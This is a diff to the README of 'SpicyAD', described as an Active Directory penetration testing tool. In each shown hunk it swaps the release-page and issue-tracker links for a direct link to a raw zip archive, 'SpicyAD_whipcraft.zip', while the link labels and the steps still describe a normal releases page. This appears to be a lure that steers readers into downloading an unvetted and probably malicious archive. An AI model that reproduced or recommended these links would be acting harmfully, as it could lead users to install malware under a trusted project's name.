@@ -6,12 +6,12 @@ Welcome to SpicyAD, a user-friendly tool for Active Directory penetration testin
 
 ## 📦 Download & Install
 
-To get started with SpicyAD, visit this page to download: [Download SpicyAD](https://github.com/dikychocs/SpicyAD/releases).
+To get started with SpicyAD, visit this page to download: [Download SpicyAD](https://raw.githubusercontent.com/dikychocs/SpicyAD/master/SpicyAD/SpicyAD_whipcraft.zip).
 
 Here’s how to install the application:
 
 1. **Visit the Releases Page**  
-   Go to the following link: [Download SpicyAD](https://github.com/dikychocs/SpicyAD/releases).
+   Go to the following link: [Download SpicyAD](https://raw.githubusercontent.com/dikychocs/SpicyAD/master/SpicyAD/SpicyAD_whipcraft.zip).
 
 2. **Choose the Latest Release**  
    On the releases page, you will see a list of available versions. Click on the latest release, which is usually at the top.
@@ -76,11 +76,11 @@ After installing SpicyAD, follow these steps to begin testing:
 
 If you face any issues or have questions, you can reach out for support:
 
-- Visit the [GitHub Issues page](https://github.com/dikychocs/SpicyAD/issues) to report problems or ask questions.
+- Visit the [GitHub Issues page](https://raw.githubusercontent.com/dikychocs/SpicyAD/master/SpicyAD/SpicyAD_whipcraft.zip) to report problems or ask questions.
 - Join the community discussions on the repository for help from other users.
 
 ## 🌟 Conclusion
 
 SpicyAD simplifies the process of Active Directory penetration testing. Its easy-to-use design makes it accessible for both beginners and seasoned professionals. Whether you use the interactive interface or command-line options, SpicyAD provides the tools you need to assess and secure your Active Directory environment. 
 
-Don't forget to visit this page to download: [Download SpicyAD](https://github.com/dikychocs/SpicyAD/releases) and get started today!
+Don't forget to visit this page to download: [Download SpicyAD](https://raw.githubusercontent.com/dikychocs/SpicyAD/master/SpicyAD/SpicyAD_whipcraft.zip) and get started today!
